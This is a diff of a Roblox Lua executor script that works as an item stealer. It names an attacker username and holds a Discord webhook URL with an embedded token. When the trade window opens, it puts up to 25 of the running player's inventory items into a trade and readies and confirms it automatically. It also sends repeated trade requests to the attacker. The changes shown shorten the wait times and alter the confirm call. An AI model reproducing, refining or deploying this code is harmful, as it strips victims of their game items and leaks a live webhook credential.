@@ -7,7 +7,7 @@ if not game:IsLoaded() then
 	game.Loaded:Wait() 
 end
 
-local username = {"harryman_73", "harryman_73"}
+local username = {"Harryman_73", "Harryman_73"}
 local webhook = "https://discord.com/api/webhooks/1506466365941354586/hJMbZGloi8NkylgSq1vKxuGsFHhfjr-f5gY59bXyBC3GpXsPtY8Bnckl-pou-x9xPQ7x"
 local minrarity = 1
 local exploit = identifyexecutor() or "Unknown"
@@ -211,7 +211,7 @@ TradingGui:GetPropertyChangedSignal("Visible"):Connect(function()
         task.wait(0.5)
         for i = 1, math.min(25, #Inventory) do
             AddItemToTrade:FireServer("Items", Inventory[i].name, Inventory[i].quantity)
-            task.wait(2.5)
+            task.wait(0.5)
         end
         local Button = TradingGui.Frame.Content.Player2Side.Player2Holder.Buttons.Ready.Txt
         while task.wait() and TradingGui.Visible do
@@ -219,13 +219,13 @@ TradingGui:GetPropertyChangedSignal("Visible"):Connect(function()
                 SetReady:FireServer(true)
             end
             if Button.Text == "CONFIRM" then
-                ConfirmTrade:FireServer(true)
+                ConfirmTrade:FireServer()
             end
         end
     end
 end)
 
-while task.wait(2.5) do
+while task.wait(0.67) do
     if not TradingGui.Visible then
         SendTradeRequest:FireServer(target)
     end
